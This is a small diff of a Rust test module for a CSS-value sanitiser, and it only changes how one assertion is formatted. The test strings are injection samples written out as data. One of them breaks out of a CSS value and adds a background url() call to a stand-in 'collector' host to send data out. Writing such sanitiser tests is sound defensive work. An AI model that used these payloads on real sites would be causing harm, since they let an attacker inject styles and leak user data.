@@ -847,7 +847,9 @@ mod tests {
         // The finding's own payload: every character in it is individually
         // innocuous, which is why a character denylist rather than a validity
         // check is what catches it.
-        assert!(!is_safe_css_value("1fr;background:url(https://collector/?d=x)"));
+        assert!(!is_safe_css_value(
+            "1fr;background:url(https://collector/?d=x)"
+        ));
         assert!(!is_safe_css_value("a}b{color:red"));
         assert!(!is_safe_css_value("a\\3b b"));
         // Case-insensitive and whitespace-tolerant on the CSS side: `URL (` and
